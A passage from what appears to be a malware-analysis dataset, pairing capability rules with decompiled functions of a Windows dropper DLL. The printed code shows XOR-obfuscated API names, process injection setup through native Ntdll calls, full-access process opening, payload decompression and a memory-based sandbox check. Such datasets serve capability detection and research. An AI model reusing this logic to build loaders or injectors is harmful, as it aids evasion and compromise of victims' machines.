(*pcVar5)(uVar6);\n    }\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : statex.ullTotalPhys : %p\", 0x175);\n    while ((iStack1168 == 0 && (uStack1172 < 1200000000))) {\n        fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : statex.ullTotalPhys -> sleep\", 0x179);\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : MemoryDetectionRoutine <<<\", 0x17d);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*pcVar5)();\n    uVar6 = (*pcVar3)();\n    (*pcVar5)(uVar6);\n    uVar6 = (*pcVar3)(0, CONCAT13(uStack1213, uStack1217._1_3_));\n    (*pcVar5)(uVar6);\n    return;\n}\n",
        "token_count": 3212
    },
    "00408116": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00408116(uchar *param_1)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    code *pcVar10;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x427d9c | *0x427da0) == 0) || ((*0x427da4 | *0x427da8) == 0)) || ((*0x427dac | *0x427db0) == 0)) {\n        var_4h = 0x7f;\n        var_24h = 0x2853015c;\n        var_20h = 0x250b1e29;\n        var_1ch._0_2_ = 0x755e;\n        var_34h = 0x44377532;\n        var_30h = 0x496f3045;\n        fcn.00401000(10);\n        iVar8 = var_ch;\n        uVar4 = 0;\n        do {\n            puVar1 = uVar4 + var_ch;\n            uVar2 = uVar4 & 0x80000007;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n            }\n            uVar4 = uVar4 + 1;\n            *puVar1 = *(&var_34h + uVar2) ^ puVar1[&var_24h - var_ch];\n        } while (uVar4 < 10);\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImport : decrypt (char) %s -> %s\", 0x14);\n        var_18h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar8);\n        if (var_18h == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            return var_4h;\n        }\n        var_34h = 0x183b141a;\n        var_30h = 0x1252293d;\n        var_2ch._0_2_ = 0x251c;\n        var_2ch._2_1_ = 0x54;\n        var_24h = 0x54497056;\n        var_20h = var_20h & 0xff000000 | 0x364852;\n        fcn.00401000(0xb);\n        iVar8 = var_10h;\n        iVar6 = 0;\n        var_14h = 7;\n        do {\n            puVar1 = iVar6 + var_10h;\n            iVar5 = iVar6 % 7;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_34h - var_10h];\n        } while (iVar6 < 0xb);\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImport : decrypt (char) %s -> %s\", 0x18);\n        *0x427d9c = fcn.0040b0be();\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        *0x427da0 = *0x427d9c >> 0x1f;\n        if ((*0x427d9c | *0x427da0) == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_4ch = 0x33471301;\n            var_48h = 0x3f384c24;\n            var_44h = 0x25115618;\n            var_40h = 0x36281a4d;\n            var_3ch = 0x5d331051;\n            var_38h._0_2_ = 0x3e1b;\n            var_38h._2_1_ = 0x77;\n            var_30h = 0x7435774d;\n            var_2ch._0_2_ = 0x3841;\n            var_2ch._2_1_ = 0x68;\n            fcn.00401000(0x17);\n            iVar8 = 0;\n            do {\n                puVar1 = iVar8 + var_8h;\n                iVar6 = iVar8 % var_14h;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_4ch - var_8h];\n            } while (iVar8 < 0x17);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImport : decrypt (char) %s -> %s\", 0x1c);\n            *0x427da4 = fcn.0040b0be();\n            *0x427da8 = *0x427da4 >> 0x1f;\n            if ((*0x427da4 | *0x427da8) == 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                (*pcVar7)(uVar3);\n                uVar3 = (*pcVar10)(0, var_ch);\n                (*pcVar7)(uVar3);\n                return var_4h;\n            }\n            var_4ch = 0x4a323029;\n            var_48h = 0x10061c1a;\n            var_44h = 0x7513433;\n            var_40h = 0x2b12161c;\n            var_3ch = 0x7185d2f;\n            var_38h._0_2_ = 0xa11;\n            var_38h._2_1_ = 0x47;\n            var_30h = 0x38624773;\n            var_2ch._0_2_ = 0x6875;\n            var_2ch._2_1_ = 99;\n            fcn.00401000(0x17);\n            uVar4 = var_20h;\n            iVar8 = 0;\n            do {\n                puVar1 = iVar8 + var_20h;\n                iVar6 = iVar8 % var_14h;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_4ch - var_20h];\n            } while (iVar8 < 0x17);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImport : decrypt (char) %s -> %s\", 0x21);\n            *0x427dac = fcn.0040b0be();\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            *0x427db0 = *0x427dac >> 0x1f;\n            if ((*0x427dac | *0x427db0) != 0) {\n                var_4h = 0;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar4);\n                pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*pcVar7)(0, var_8h);\n                (*pcVar10)(uVar3);\n                uVar3 = (*pcVar7)(0, var_10h);\n                (*pcVar10)(uVar3);\n                uVar3 = (*pcVar7)(0, var_ch);\n                (*pcVar10)(uVar3);\n                goto code_r0x0040846d;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar4);\n            pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar7)(0, var_8h);\n            (*pcVar10)(uVar3);\n            uVar3 = (*pcVar7)(0, var_10h);\n        }\n        (*pcVar10)(uVar3);\n        uVar3 = (*pcVar7)(0, var_ch);\n        (*pcVar10)(uVar3);\n    }\n    else {\ncode_r0x0040846d:\n        puVar9 = 0x427d9c;\n        for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *var_28h = *puVar9;\n            puVar9 = puVar9 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2302
    },
    "00408483": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00408483(uchar *param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uchar *puVar8;\n    code *pcVar9;\n    int32_t iVar10;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_28h = param_1;\n    if ((((*0x427d84 | *0x427d88) == 0) || ((*0x427d8c | *0x427d90) == 0)) || ((*0x427d94 | *0x427d98) == 0)) {\n        var_8h = 0x7f;\n        var_24h = 0x2853015c;\n        var_20h = 0x250b1e29;\n        var_1ch._0_2_ = 0x755e;\n        var_34h = 0x44377532;\n        var_30h = 0x496f3045;\n        var_18h = param_2;\n        fcn.00401000(10);\n        uVar4 = 0;\n        do {\n            puVar1 = uVar4 + var_ch;\n            uVar2 = uVar4 & 0x80000007;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n            }\n            uVar4 = uVar4 + 1;\n            *puVar1 = *(&var_34h + uVar2) ^ puVar1[&var_24h - var_ch];\n        } while (uVar4 < 10);\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImportArch : decrypt (char) %s -> %s\", 0x3c);\n        var_34h = 0x183b141a;\n        var_30h = 0x1252293d;\n        var_2ch._0_2_ = 0x251c;\n        var_2ch._2_1_ = 0x54;\n        var_24h = 0x54497056;\n        var_20h = var_20h & 0xff000000 | 0x364852;\n        fcn.00401000(0xb);\n        iVar10 = var_10h;\n        iVar6 = 0;\n        var_14h = 7;\n        do {\n            puVar1 = iVar6 + var_10h;\n            iVar5 = iVar6 % 7;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_34h - var_10h];\n        } while (iVar6 < 0xb);\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImportArch : decrypt (char) %s -> %s\", 0x3d);\n        iVar6 = var_ch;\n        *0x427d84 = fcn.0040bf79(iVar10);\n        if (*0x427d84 == 0) {\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImportArch : LdrLoadDll not found\", 0x3f);\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n            var_ch = iVar6;\n            pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_4ch = 0x33471301;\n            var_48h = 0x3f384c24;\n            var_44h = 0x25115618;\n            var_40h = 0x36281a4d;\n            var_3ch = 0x5d331051;\n            var_38h._0_2_ = 0x3e1b;\n            var_38h._2_1_ = 0x77;\n            var_30h = 0x7435774d;\n            var_2ch._0_2_ = 0x3841;\n            var_2ch._2_1_ = 0x68;\n            fcn.00401000(0x17);\n            iVar10 = 0;\n            do {\n                puVar1 = iVar10 + var_4h;\n                iVar6 = iVar10 % var_14h;\n                iVar10 = iVar10 + 1;\n                *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_4ch - var_4h];\n            } while (iVar10 < 0x17);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImportArch : decrypt (char) %s -> %s\", 0x43);\n            iVar10 = var_ch;\n            *0x427d8c = fcn.0040bf79(var_4h);\n            if (*0x427d8c == 0) {\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImportArch : LdrGetProcedureAddress not found\", \n                             0x45);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n                pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                (*pcVar9)(uVar3);\n                uVar3 = (*pcVar7)(0, iVar10);\n                (*pcVar9)(uVar3);\n                goto code_r0x004087fc;\n            }\n            var_4ch = 0x4a323029;\n            var_48h = 0x10061c1a;\n            var_44h = 0x7513433;\n            var_40h = 0x2b12161c;\n            var_3ch = 0x7185d2f;\n            var_38h._0_2_ = 0xa11;\n            var_38h._2_1_ = 0x47;\n            var_30h = 0x38624773;\n            var_2ch._0_2_ = 0x6875;\n            var_2ch._2_1_ = 99;\n            fcn.00401000(0x17);\n            uVar4 = var_20h;\n            iVar10 = 0;\n            do {\n                puVar1 = iVar10 + var_20h;\n                iVar6 = iVar10 % var_14h;\n                iVar10 = iVar10 + 1;\n                *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_4ch - var_20h];\n            } while (iVar10 < 0x17);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImportArch : decrypt (char) %s -> %s\", 0x49);\n            *0x427d94 = fcn.0040bf79(uVar4);\n            pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x427d94 != 0) {\n                var_8h = 0;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar4);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*pcVar9)(0, var_4h);\n                (*pcVar7)(uVar3);\n                uVar3 = (*pcVar9)(0, var_10h);\n                (*pcVar7)(uVar3);\n                uVar3 = (*pcVar9)(0, var_ch);\n                (*pcVar7)(uVar3);\n                goto code_r0x004087ef;\n            }\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > InitProcessImportArch : ZwProtectVirtualMemory not found\", 0x4b\n                        );\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar4);\n            pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar7)(0, var_4h);\n            (*pcVar9)(uVar3);\n            uVar3 = (*pcVar7)(0, var_10h);\n        }\n        (*pcVar9)(uVar3);\n        uVar3 = (*pcVar7)(0, var_ch);\n        (*pcVar9)(uVar3);\n    }\n    else {\ncode_r0x004087ef:\n        puVar8 = 0x427d84;\n        for (iVar10 = 0x18; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *var_28h = *puVar8;\n            puVar8 = puVar8 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\ncode_r0x004087fc:\n    *0x427d98 = *0x427d94 >> 0x20;\n    *0x427d90 = *0x427d8c >> 0x20;\n    *0x427d88 = *0x427d84 >> 0x20;\n    return var_8h;\n}\n",
        "token_count": 2372
    },
    "0040a2a4": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.0040a2a4(int32_t *param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    code *var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0xc0000023;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (piVar2 = param_1[1],  piVar2 != NULL)) {\n        if (*param_1 == *piVar2) {\n            var_34h = 0x10051c11;\n            var_30h = 0x2e2b2d14;\n            var_2ch = 0x2311b18;\n            var_28h = 0xe36063d;\n            var_24h = 0x4e03310f;\n            var_20h = 0x54696843;\n            var_1ch = var_1ch & 0xff000000 | 0x444e71;\n            var_18h = param_2;\n            var_14h = param_1;\n            var_8h = piVar2;\n            fcn.00401000(0x14);\n            iVar8 = 0;\n            do {\n                var_10h = 0x7;\n                puVar1 = iVar8 + var_4h;\n                iVar6 = iVar8 % 7;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_20h + iVar6) ^ puVar1[&var_34h - var_4h];\n            } while (iVar8 < 0x14);\n            fcn.00403bde(\"GTK DLL: PackedImage.cpp:%d > DecompressMalwareImage : decrypt (char) %s -> %s\", 0x49);\n            var_2ch = 0x2853015c;\n            var_28h = 0x250b1e29;\n            var_24h = CONCAT22(var_24h._2_2_, 0x755e);\n            var_20h = 0x44377532;\n            var_1ch = 0x496f3045;\n            fcn.00401000(10);\n            piVar2 = var_8h;\n            iVar8 = var_10h;\n            uVar7 = 0;\n            do {\n                puVar1 = uVar7 + var_10h;\n                uVar4 = uVar7 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar7 = uVar7 + 1;\n                *puVar1 = *(&var_20h + uVar4) ^ puVar1[&var_2ch - var_10h];\n            } while (uVar7 < 10);\n            fcn.00403bde(\"GTK DLL: PackedImage.cpp:%d > DecompressMalwareImage : decrypt (char) %s -> %s\", 0x4a);\n            iVar3 = var_4h;\n            uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar8, var_4h);\n            var_10h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar2[1]);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            iVar6 = *piVar2;\n            var_14h = var_14h[1] + 0xc;\n            fcn.0040a209();\n            piVar2 = var_8h;\n            var_8h = (*var_10h)(2, var_4h, var_8h[1], var_14h, iVar6 + -0xc, &var_ch);\n            if (var_8h == NULL) {\n                if (var_ch == piVar2[1]) {\n                    var_18h[1] = var_4h;\n                    *var_18h = var_ch;\n                }\n                else {\n                    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    var_8h = 0xc000007b;\n                }\n            }\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        else {\n            var_8h = 0xc000007b;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1270
    },
    "0040b1bd": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040b1bd(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t lpModuleName;\n    \n    var_20h = 0x2853015c;\n    var_1ch = 0x250b1e29;\n    var_18h._0_2_ = 0x755e;\n    var_14h = 0x44377532;\n    var_10h = 0x496f3045;\n    fcn.00401000(10);\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + lpModuleName;\n        uVar4 = uVar8 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_14h + uVar4) ^ puVar1[&var_20h - lpModuleName];\n    } while (uVar8 < 10);\n    fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupOpenProcessNative : decrypt (char) %s -> %s\", 0x1f8);\n    var_24h = 0x37390e13;\n    var_20h = 0x3b693a2c;\n    var_1ch = 0x3a221516;\n    var_18h._0_2_ = 0x3927;\n    var_14h = 0x47767949;\n    var_10h = var_10h & 0xff000000 | 0x395449;\n    fcn.00401000(0xe);\n    iVar3 = var_8h;\n    iVar10 = 0;\n    iVar7 = &var_24h - var_8h;\n    do {\n        var_8h = 7;\n        puVar1 = iVar10 + iVar3;\n        iVar9 = iVar10 % 7;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_14h + iVar9) ^ puVar1[iVar7];\n    } while (iVar10 < 0xe);\n    fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupOpenProcessNative : decrypt (char) %s -> %s\", 0x1f9);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5, iVar3);\n    iVar7 = (*pcVar6)(var_ch, 0x1f0fff, arg_8h, arg_ch);\n    if (iVar7 < 0) {\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupOpenProcessNative : nt_raw_OpenProcess failed, res: %x\\n\", 0x205);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, lpModuleName);\n    (*pcVar6)(uVar5);\n    return iVar7;\n}\n",
        "token_count": 914
    },
    "0040ba44": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040ba44(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    code *pcVar7;\n    code *pcVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uchar var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    if ((*0x427dc0 | *0x427dc4) != 0) {\ncode_r0x0040be24:\n        var_10h = 0x427dc0;\n        goto code_r0x0040be29;\n    }\n    var_24h = 0x2853015c;\n    var_20h = 0x250b1e29;\n    var_1ch._0_2_ = 0x755e;\n    var_18h = 0x44377532;\n    var_14h = 0x496f3045;\n    fcn.00401000(10);\n    iVar3 = var_ch;\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_ch;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_18h + uVar4) ^ puVar1[&var_24h - var_ch];\n    } while (uVar6 < 10);\n    fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupResolveNativePointers : decrypt (char) %s -> %s\", 0x2f6);\n    var_2ch = 0x6362320;\n    var_28h = 0x585e0032;\n    var_24h = 0x1709310e;\n    var_20h = 0x53432b12;\n    var_1ch._0_2_ = 0x301b;\n    var_1ch._2_1_ = 0x71;\n    var_18h = 0x6371547a;\n    var_14h = 0x36314346;\n    fcn.00401000(0x13);\n    iVar2 = var_ch;\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_ch;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_18h + uVar4) ^ puVar1[&var_2ch - var_ch];\n    } while (uVar6 < 0x13);\n    fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupResolveNativePointers : decrypt (char) %s -> %s\", 0x2f8);\n    *0x427dc0 = fcn.0040bf79(iVar2);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x427dc0 == 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x0040bb7a:\n        (*pcVar8)(uVar5);\n        uVar5 = (*pcVar7)(0, iVar3);\n        (*pcVar8)(uVar5);\n    }\n    else {\n        var_2ch = 0xd293d32;\n        var_28h = 0x173d7112;\n        var_24h = 0x1c022f1c;\n        var_20h = 0x1c205a32;\n        var_1ch._0_2_ = 0x2e09;\n        var_1ch._2_1_ = 0x7a;\n        var_18h = 0x687a4a68;\n        var_14h = 0x79523266;\n        fcn.00401000(0x13);\n        uVar6 = 0;\n        do {\n            puVar1 = uVar6 + var_4h;\n            uVar4 = uVar6 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar6 = uVar6 + 1;\n            *puVar1 = *(&var_18h + uVar4) ^ puVar1[&var_2ch - var_4h];\n        } while (uVar6 < 0x13);\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupResolveNativePointers : decrypt (char) %s -> %s\", 0x2fc);\n        *0x427dc8 = fcn.0040bf79(var_4h);\n        if (*0x427dc8 == 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_44h = 0x29343822;\n            var_40h = 0x103b6120;\n            var_3ch = 0x1b1f000f;\n            var_38h = 0x1c265435;\n            var_34h = var_34h & 0xff000000 | 0x792117;\n            var_24h = 0x48794f78;\n            var_20h = 0x75523750;\n            fcn.00401000(0x13);\n            uVar6 = 0;\n            do {\n                puVar1 = uVar6 + var_8h;\n                uVar4 = uVar6 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar6 = uVar6 + 1;\n                *puVar1 = *(&var_24h + uVar4) ^ puVar1[&var_44h - var_8h];\n            } while (uVar6 < 0x13);\n            fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupResolveNativePointers : decrypt (char) %s -> %s\", 0x300);\n            *0x427dd0 = fcn.0040bf79(var_8h);\n            if (*0x427dd0 != 0) {\n                var_44h = 0x16162417;\n                var_40h = 0x2133505b;\n                var_3ch = 0x37343624;\n                var_38h = 0x14266250;\n                var_34h = 0x162c3a39;\n                var_30h = 0x36;\n                var_24h = 0x7843534d;\n                var_20h = 0x77433136;\n                fcn.00401000(0x15);\n                iVar2 = var_14h;\n                uVar6 = 0;\n                do {\n                    puVar1 = uVar6 + var_14h;\n                    uVar4 = uVar6 & 0x80000007;\n                    if (uVar4 < 0) {\n                        uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar6 = uVar6 + 1;\n                    *puVar1 = *(&var_24h + uVar4) ^ puVar1[&var_44h - var_14h];\n                } while (uVar6 < 0x15);\n                fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupResolveNativePointers : decrypt (char) %s -> %s\", 0x304);\n                *0x427dd8 = fcn.0040bf79(iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (*0x427dd8 != 0) {\n                    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    uVar5 = (*pcVar7)(0, var_8h);\n                    (*pcVar8)(uVar5);\n                    uVar5 = (*pcVar7)(0, var_4h);\n                    (*pcVar8)(uVar5);\n                    uVar5 = (*pcVar7)(0, var_ch);\n                    (*pcVar8)(uVar5);\n                    uVar5 = (*pcVar7)(0, iVar3);\n                    (*pcVar8)(uVar5);\n                    goto code_r0x0040be24;\n                }\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                uVar5 = (*pcVar7)(0, var_8h);\n                (*pcVar8)(uVar5);\n                uVar5 = (*pcVar7)(0, var_4h);\n                (*pcVar8)(uVar5);\n                uVar5 = (*pcVar7)(0, var_ch);\n                goto code_r0x0040bb7a;\n            }\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        }\n        (*pcVar7)(uVar5);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar5 = 